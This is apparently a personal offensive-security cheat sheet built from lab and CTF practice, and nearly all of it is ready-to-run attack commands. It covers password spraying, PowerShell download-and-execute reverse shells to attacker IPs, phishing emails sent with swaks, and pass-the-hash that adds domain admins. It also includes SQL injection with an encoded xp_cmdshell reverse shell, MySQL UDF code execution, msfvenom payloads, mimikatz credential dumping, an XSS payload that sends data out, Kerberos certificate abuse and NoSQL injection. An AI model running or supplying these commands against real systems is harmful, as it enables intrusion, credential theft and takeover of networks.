+<div class='code'>distinguishedName &colon; &lcub;DC&equals;corp&comma;DC&equals;com&rcub;<br>Path              &colon; LDAP&colon;&sol;&sol;DC1&period;corp&period;com&sol;DC&equals;corp&comma;DC&equals;com</div>
+
+[[2f5860a837c448dfaf95103b31aebb77.ps1]]
+`.\Spray-Passwords.ps1 -Pass Nexus123! -Admin`
+
+`.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"`
+
+
+# Wordpress:
+`wpscan --url http://192.168.197.244/ --enumerate p --plugins-detection aggressive`
+
+### Plugin:
+1. duplicator:
+1.1 Verison 1.3.26: [[e1928c02da8740a6975c9de30cdb4a92.py]]
+
+# Ruby web server:
+- Điền đại http://\<IP\>:\<PORT\>/asfasjhgfajkshgfaskjfhk để theo dõi Trace debug
+- - Biết được endpoints
+
+# Phising:
+## Sendmail:
+`sudo /home/yuiw/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /tmp/webdav/`
+
+`powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.3:8000/powercat.ps1');
+powercat -c 192.168.119.3 -p 4444 -e powershell"`
+
+[[90e2273a66d9495bbca009d69704a7f8.py]]
+
+`sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap`
+
+`python ~/Downloads/macro_reverse_shell/generate.py 192.168.45.219 80 > shell.vba`
+
+
+#### Invoke-SMBExec
+`Invoke-SMBExec.ps1 -Target 10.200.89.100 -Domain thereserve.loc -Username Administrator -Hash 600a406c2c1f2062eb9bb227bad654aa -Command "net user <username> <password> /add /domain"`
+`Invoke-SMBExec.ps1 -Target 10.200.89.100 -Domain thereserve.loc -Username Administrator -Hash 600a406c2c1f2062eb9bb227bad654aa -Command "net localgroup Administrators <username> /add"`
+`Invoke-SMBExec.ps1 -Target 10.200.89.100 -Domain thereserve.loc -Username Administrator -Hash 600a406c2c1f2062eb9bb227bad654aa -Command "net group 'Domain Admins' <username> /ADD /DOMAIN"`
+`Invoke-SMBExec.ps1 -Target 10.200.89.100 -Domain thereserve.loc -Username Administrator -Hash 600a406c2c1f2062eb9bb227bad654aa -Command "net group 'Remote Desktop Users' <username> /ADD /DOMAIN"`
+
+
+#### Crack VNC: https://github.com/frizb/PasswordDecrypts
+- `echo -n <passwd> | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv`
+
+
+#### Mssql rev:
+`admin' EXEC sp_configure 'show advanced options', '1' --`
+`admin' RECONFIGURE --`
+`admin' EXEC sp_configure 'xp_cmdshell', '1' --`
+`admin' RECONFIGURE --`
+`admin' EXEC master..xp_cmdshell 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEAOAA0ACIALAA4ADgAOAA4ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==';--`
+
+
+#### Git:
+- `gitdumper http://192.168.193.108/.git/ .`
+- `git log`
+- `git status`
+- `git reset --hard`
+
+
+#### Webdav:
+`cadaver 192.168.175.122`
+
+
+#### Mysql rce:
+1. `SHOW VARIABLES LIKE 'plugin_dir';` 
+2. `SHOW VARIABLES LIKE "secure_file_priv";` (Nếu Value là rỗng thì nên khai thác)
+3. Transfer .so/.dll to victim(*Note:* `chmod 777 *.so`)
+4. `mysql -h 127.0.0.1 -u <user> -p`
+4.1. `use mysql;`
+4.2. `create table kashz(line blob);`
+4.3. `insert into kashz values(load_file('/tmp/lib_mysqludf_sys_64.so'));`
+4.4. `select * from kashz into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys_64.so';`
+4.5. `create function sys_exec returns integer soname 'lib_mysqludf_sys_64.so';`
+4.6. `select sys_exec('chmod +s /bin/bash');`
+
+
+#### msfvenom:
+- `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.235 LPORT=80 -f exe > rev.exe`
+- `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.235 LPORT=80 -f exe > rev.exe`
+
+- `msfvenom -p windows/shell/reverse_tcp LHOST=192.168.45.237 LPORT=80 EXITFUNC=thread -f python -v shell`
+- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.237 LPORT=80 EXITFUNC=thread -f python -v shell`
+
+
+
+#### mimikatz:
+`certutil -urlcache -split -f http://192.168.45.189/tools/windows-resources/mimikatz/x64/mimikatz.exe C:\users\public\mimikatz.exe`
+
+`C:\users\public\mimikatz.exe "log" "log C:\\Users\\Public\\output.log" "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "sekurlsa::msv" "log /stop" "exit"`
+
+
+#### Simple Python server print header:
+[[efb06f8ae78745cd9d4a8f4ebf6fa96e.py]]
+
+#### SMB:
+- Create new share: `net share yuiw=c:\shared`
+- Remove shared: `net share /delete yuiw`
+
+
+#### Crackmapexec/[[[REDTEAM]/Windows/netexec|netexec]]:
+`cme smb <IP> -u '' -p '' --shares`
+`cme smb <IP> -u '' -p '' --users --rid-brute`
+`cme smb <IP> -u 'a' -p '' --shares --users --rid-brute`
+`cme smb <IP> -u 'a' -p /usr/share/seclists/Passwords/Leaked-Databases/rockyou-10.txt --shares --users --rid-brute`
+`cme smb <IP> -u 'SVC-Kerb' -p /usr/share/seclists/Passwords/Leaked-Databases/rockyou-10.txt`
+
+
+
+# XSS:
+1. `echo $target | waybackurls | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq`
+2. `waybackurls $target | grep '=' | qsreplace '"><script>alert(1)</script>' | while read host; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host\033[0;31m" Vulnerable; done`
+3. `waybackurls $target | urldedupe -qs | bhedak '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'`
+4. `echo $target | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq`
+5. `echo $target | waybackurls | kxss (search parametar xss)`
+6. `echo $target | waybackurls | gf xss | uro | httpx -silent | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)"`
+7. `cat domains.txt | gf xss | grep 'source=' | qsreplace '"<script>confirm(1)</script>"' | while read host; do curl -silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host\033[0;31m" Vulnerable; done`
+8. `<script>fetch("http://127.0.0.1/dir/pass.txt").then(r => r.text()).then(t => fetch("http://attack-box:1234?q="+t,{mode:"no-cors"}))</script>`
+
+
+
+
+# Wifi - WPA - WPA2:
+`hcxpcapngtool VanSpy.pcapng -E essidlist -o hash -john hash.john`
+`john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --fork=64 ./hash.john`
+
+
+# Redteam:
+## Cert RDP: 
+[](https://github.com/GoSecure/pyrdp/blob/master/docs/cert-extraction.md)
+cmd /c mimikatz.exe privilege::debug token::elevate crypto::capi "crypto::certificates /systemstore:LOCAL_MACHINE /store:\`"Remote Desktop\`" /export" exit
+-> Got .der and .pfx
+`openssl pkcs12 -nodes -in privkey.pfx -out privkey.pem`
+*Default password for .pfx file is "mimikatz"*
+
+Wireshark: Edit->Preferences...->Protocols->TLS->RSA keys list->Edit...->+->any|3389||privkey.pem|
+Wireshark: File -> Export PDUs and selecting OSI Layer 7 and save it
+
+`docker run -v '/home/yuiw/Downloads/TryHackMe/The Return of the Yeti/':/shared gosecure/pyrdp pyrdp-convert -o /shared/output /shared/VanSpy_PDUs.pcap`
+`pyrdp-player ./20231125145052_10.0.0.2:55510-10.1.1.1:3389.pyrdp`
+
+
+# Whiskey:
+`Find-InterestingDomainAcl -ResolveGuids | Where-Object { $_.IdentityReferenceName -eq "hr" } | Select-Object IdentityReferenceName, ObjectDN, ActiveDirectoryRights`
+-> hr                    CN=**vansprinkles**,CN=Users,DC=AOC,DC=local ListChildren, ReadProperty, GenericWrite
+
+` .\Whisker.exe add /target:vansprinkles`
+-> [*] No path was provided. The certificate will be printed as a Base64 blob
+[*] No pass was provided. The certificate will be stored with the password 5xqiQoPN22bFq0qp
+[*] Searching for the target account
+[*] Target user found: CN=vansprinkles,CN=Users,DC=AOC,DC=local
+[*] Generating certificate
+[*] Certificate generaged
+[*] Generating KeyCredential
+[*] KeyCredential generated with DeviceID c71dc9ac-bebe-4d62-ad19-fb89b86a1e49
+[*] Updating the msDS-KeyCredentialLink attribute of the target object
+[+] Updated the msDS-KeyCredentialLink attribute of the target object
+[*] You can now run Rubeus with the following syntax:
+
+Rubeus.exe asktgt /user:vansprinkles /certificate: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 /password:"5xqiQoPN22bFq0qp" /domain:AOC.local /dc:southpole.AOC.local /getcredentials /show
+
+`.\Rubeus.exe asktgt /user:vansprinkles /certificate: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 /password:"5xqiQoPN22bFq0qp" /domain:AOC.local /dc:southpole.AOC.local /getcredentials /show`
+
+
+
+
+
+`python noPac/noPac.py 'aoc.local/vansprinkles' -hashes 00000000000000000000000000000000:03E805D8A8C5AA435FB48832DAD620E3 -dc-ip 10.10.64.116 -shell --impersonate administrator -use-ldap -no-pass`
+
+
+# Sqli:
+- `python3 sqlmap.py -u <API> --forms --dbms=mysql -p username --skip-heuristic --drop-set-cookie --technique=B --code=302`
+	--technique=B (blind)
+	--code=302 (Status code 302 like success as 200)
+- `python3 sqlmap.py -u <API> --forms --dbms=mysql -p username --code=302 --dump --tamper=ord2ascii,ifnull2ifisnull,hex2char --skip-heuristic --drop-set-cookie --flush-session`
+
+
+
+
+
+
+
+`curl -s "https://crt.sh/?O=Apple%20Inc.&output=json" | jq -r " .[].common_name" | tr A-Z a-z | unfurl format %r.%t | sort -u | tee apple.cert.txt`
+
+
+
+
+
+
+
+
+# NoSQL Injection:
+## Syntax Inject:
+`admin' && 0 && 'x`
+`admin' && 1 && 'x`
+`admin'||1||'`
+
+## Operator Inject:
+### Burpsuite:
+Example: **user=admin&password=pass123!**
+`user[$ne]=aaaaa&pass[$ne]=aaaaa` (like OR 1 = 1 in SQLi)
+`user[$nin][]=admin&pass[$ne]=aaaaa` (user not in \['admin'\])
+`user[$nin][]=admin&user[$nin][]=john&pass[$ne]=aaaaa` (user not in \['admin', 'john'\])
+`user[$nin][]=admin&pass[$regex]=^pass.{10}$` (use regex to bruteforce password)
+
+
+
+
+
+
+
+# Windows Startup:
+1. `shell:common startup` (C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup) (All users)
+2. `shell:startup` (All users)
+3. `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run` (All users)
+4. `HKLM\Software\Microsoft\Windows\CurrentVersion\Run` (All users)
+5. `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` (Current users)
